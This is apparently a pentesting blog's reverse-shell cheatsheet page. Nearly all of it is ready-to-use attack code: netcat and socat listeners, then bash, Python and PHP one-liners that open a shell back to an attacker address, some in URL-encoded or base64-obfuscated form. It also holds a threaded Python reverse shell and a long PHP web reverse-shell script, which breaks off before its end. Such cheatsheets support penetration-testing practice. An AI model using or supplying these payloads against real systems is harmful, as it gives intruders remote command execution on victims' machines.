                        <span>Home</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/about/" title="About">
                        <span>About</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
                        <span>Archives</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
                        <span>Cheatsheets</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
                        <span>Search</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
                        <span>Tags</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
                        <span>Categories</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
                        <span>Projects</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
                        <span>Contact</span>
                    </a>
                </li>
            </ul>
        </div>
    </nav>
</header>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
    const mobileMenu = document.getElementById('mobile-menu');
    const body = document.body;
    
    if (mobileMenuToggle && mobileMenu) {
        mobileMenuToggle.addEventListener('click', function() {
            const isOpen = mobileMenu.classList.contains('active');
            
            if (isOpen) {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            } else {
                mobileMenu.classList.add('active');
                mobileMenuToggle.classList.add('active');
                body.classList.add('mobile-menu-open');
            }
        });
        
        
        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
        mobileMenuLinks.forEach(link => {
            link.addEventListener('click', function() {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            });
        });
        
        
        document.addEventListener('click', function(event) {
            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            }
        });
    }
});
</script><main class="main">
<link rel="stylesheet" href="/css/cheatsheet-style.css">

<article class="post-single cheatsheet-page">
  <header class="post-header">
    <div class="breadcrumbs">
      <a href="/">Home</a> &nbsp;/&nbsp; <a href="/cheatsheets/">Cheatsheets</a> &nbsp;/&nbsp; Reverse Shell Cheatsheet
    </div>
    <h1 class="post-title">
      Reverse Shell Cheatsheet
    </h1>
    <div class="post-description">
      Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages
    </div>
    <div class="post-meta">
      <span title='January 1, 2024'>
        January 1, 2024
      </span>
      <span class="post-tags">
        <a href="/tags/reverse-shells">#reverse-shells</a>
        <a href="/tags/payload">#payload</a>
        <a href="/tags/post-exploitation">#post-exploitation</a>
        <a href="/tags/pentesting">#pentesting</a>
      </span>
    </div>
  </header>

  <div class="post-content"><h1 id="reverse-shell-cheatsheet">Reverse Shell Cheatsheet</h1>
<h2 id="setup-listener">Setup Listener</h2>
<h3 id="netcat-listener">Netcat Listener</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic netcat listener</span>
</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Enhanced with rlwrap for better shell experience</span>
</span></span><span class="line"><span class="cl">rlwrap nc -nlvp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># OpenBSD netcat</span>
</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Traditional netcat</span>
</span></span><span class="line"><span class="cl">nc -l -p <span class="m">9001</span>
</span></span></code></pre></div><h3 id="socat-listener">Socat Listener</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic socat listener</span>
</span></span><span class="line"><span class="cl">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> tcp-listen:9001
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Encrypted socat listener</span>
</span></span><span class="line"><span class="cl">socat openssl-listen:9001,cert<span class="o">=</span>server.crt,key<span class="o">=</span>server.key,verify<span class="o">=</span><span class="m">0</span> -
</span></span></code></pre></div><hr>
<h2 id="bash-reverse-shells">Bash Reverse Shells</h2>
<h3 id="basic-bash">Basic Bash</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Standard bash reverse shell</span>
</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.13/9001 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Alternative syntax</span>
</span></span><span class="line"><span class="cl">bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># URL encoded for web applications</span>
</span></span><span class="line"><span class="cl">bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261%27
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Base64 encoded</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85MDAxIDA+JjE<span class="o">=</span> <span class="p">|</span> base64 -d <span class="p">|</span> bash
</span></span></code></pre></div><h3 id="bash-variations">Bash Variations</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Using exec</span>
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 5&lt;&gt;/dev/tcp/10.10.14.13/9001<span class="p">;</span>cat &lt;<span class="p">&amp;</span><span class="m">5</span> <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> line<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> 2&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span>5<span class="p">;</span> <span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Using /bin/sh</span>
</span></span><span class="line"><span class="cl">/bin/sh -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.13/9001 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># With specific shell path</span>
</span></span><span class="line"><span class="cl">/usr/bin/bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.13/9001 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span></code></pre></div><hr>
<h2 id="python-reverse-shells">Python Reverse Shells</h2>
<h3 id="python-2--3-compatible">Python 2 &amp; 3 Compatible</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Standard Python reverse shell</span>
</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Python with pty spawn</span>
</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;);&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Python3 specific</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></div><h3 id="python-pty-shell">Python PTY Shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Interactive shell with PTY</span>
</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Local Python PTY spawn (after getting basic shell)</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><h3 id="advanced-python-shell">Advanced Python Shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Multi-line Python reverse shell</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">subprocess</span><span class="o">,</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">threading</span><span class="o">,</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">s2p</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">p2s</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;10.10.14.13&#34;</span><span class="p">,</span> <span class="mi">9001</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s2p_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">s2p</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">p2s_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">p2s</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">s2p_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="n">p2s_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="n">s2p_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p2s_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><hr>
<h2 id="php-reverse-shells">PHP Reverse Shells</h2>
<h3 id="basic-php">Basic PHP</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># Simple PHP reverse shell
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;10.10.14.13&#34;,9001);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># PHP with error handling
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;10.10.14.13&#34;,9001);if($sock){$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);}&#39;</span>
</span></span></code></pre></div><h3 id="web-based-php-shell">Web-based PHP Shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.13&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$port</span> <span class="o">=</span> <span class="mi">9001</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;uname -a; w; id; /bin/sh -i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;pcntl_fork&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pid</span> <span class="o">=</span> <span class="nx">pcntl_fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Can&#39;t fork&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Error: Can&#39;t setsid()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;WARNING: Failed to daemonise. This is quite common and not fatal.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$sock</span> <span class="o">=</span> <span class="nx">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$process</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Can&#39;t spawn shell&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell connection terminated&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell process terminated&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nx">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK READ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT READ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR READ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
